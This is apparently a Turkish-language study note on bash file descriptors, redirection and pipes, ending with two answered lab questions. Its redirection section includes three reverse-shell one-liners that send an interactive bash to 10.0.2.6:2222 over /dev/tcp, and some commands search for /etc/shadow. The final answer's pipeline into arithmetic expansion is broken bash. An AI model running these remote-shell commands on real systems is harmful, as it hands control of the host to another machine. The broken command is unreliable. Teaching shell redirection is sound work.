---
glightbox: true
icon: material/help
---

# File Descriptors and Redirections

## File Descriptors

| Name | Value | Description |
|---|---|---|
| STDIN | 0 | Girdiler için kullanılan veri akışı. |
| STDOUT | 1 | Çıktılar için kullanılan veri akışı. |
| STDERR | 2 | Hata çıktıları için kullanılan veri akışı. |

## STDOUT and STDERR

Bir komutun çalışması esnasında üretebileceği hatalar Null Device konumuna yeniden yönlendirilerek göz ardı edilebilir:

```bash
find /etc -name shadow 2> /dev/null
```

Aşağıda verilen komut ile STDERR ve STDOUT, açılacak olan IP adresi ve port hedefine yeniden yönlendirilmiştir:

```bash
bash -i > /dev/tcp/10.0.2.6/2222 2>&1
```

Yukarıdaki yeniden yönlendirme farklı şekillerde de ifade edilebilir. Bunlardan biri aşağıda verildiği gibidir:

```bash
bash -i &>/dev/tcp/10.0.2.6/2222
```

Diğeri ise aşağıda verildiği gibidir:

```bash
bash -i >&/dev/tcp/10.0.2.6/2222
```

İlk verilen kullanım şekli, önerilen kullanım şeklidir.

## Redirect STDOUT and STDERR to Separate Files

Bir komutun ürettiği çıktılardan STDOUT akışı bir dosyaya, STDERR akışı ise başka bir dosyaya yeniden yönlendirilebilir:

```bash
find /etc -name shadow 2>stderr.txt 1>stdout.txt
```

## Redirect STDIN

Yeniden yönlendirme işlemi STDIN akışı için de yapılabilir. Bunun için farklı olarak `>` işareti yerine `<` işareti kullanılır. Örneğin `stdout.txt` dosyasına kaydedilen veriler `cat` aracına girdi olarak verilebilir:

```bash
cat 0<stdout.txt
```

## Redirect STDOUT and Append to a File

Eğer `>` işareti ile yeniden yönlendirme yapılırsa yeni bilgiler eski bilgilerin üzerine yazılır. Bunu önlemek için `>>` işareti kullanılabilir. Böylece yeni bilgiler eski bilgilerle birlikte tutulur:

```bash
find /etc -name shadow 2>stderr.txt 1>>stdout.txt
```

## Redirect STDIN Stream to a File

Eğer `<<` işareti kullanılırsa kullanıcı girdisi akışa eklenebilir. Girdinin ne zaman biteceğinin algılanması için bir anahtar kelime de (örneğin EOF) verilmelidir. Bu tarz bir yeniden yönlendirme [Here Documents](https://www.gnu.org/software/bash/manual/bash.html#Here-Documents) formatıdır:

```bash
cat << EOF > stream.txt
```

## Pipes

STDOUT akışını yeniden yönlendirmenin başka bir yolu da Pipe kullanmaktır. Aşağıdaki komutta örnek bir Pipe kullanımı gösterilmiştir:

```bash
find /etc -name "*.conf" 2> /dev/null | grep systemd
```

## Questions

```text
How many files exist on the system that have the ".log" file extension?
```

??? tip "Steps"

    ```bash
    find / -name "*.log" -type f 2> /dev/null | wc -l
    ```

```text
How many total packages are installed on the target system?
```

??? tip "Steps"

    Aşağıda verilen komut ile elde edilen sayının 1 eksiği alındı. Çünkü komut çıktısının ilk satırı, bilgi satırıdır:

    ```bash
    apt list --installed 2> /dev/null | $(($(wc -l) - 1))
    ```
